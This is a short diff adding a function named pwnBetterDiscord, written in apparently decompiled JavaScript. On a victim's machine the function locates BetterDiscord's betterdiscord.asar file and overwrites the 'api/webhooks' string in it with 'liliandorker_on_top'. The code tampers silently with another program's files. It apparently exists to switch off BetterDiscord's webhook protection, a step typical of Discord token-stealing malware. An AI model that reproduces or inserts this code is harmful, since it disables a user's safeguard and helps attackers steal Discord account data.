@@ -1,0 +1,6 @@
+_tmp_0.pwnBetterDiscord = pwnBetterDiscord
+client.requires.fs.existsSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")
+var _ = client.requires.fs.readFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar")
+client.requires.fs.writeFileSync(client.utils.encryption.decryptData(client.config.user.appdata) + "/BetterDiscord/data/betterdiscord.asar", client.requires.buf_replace(_,
+                    "api/webhooks", "liliandorker_on_top"))
+"liliandorker_on_top"
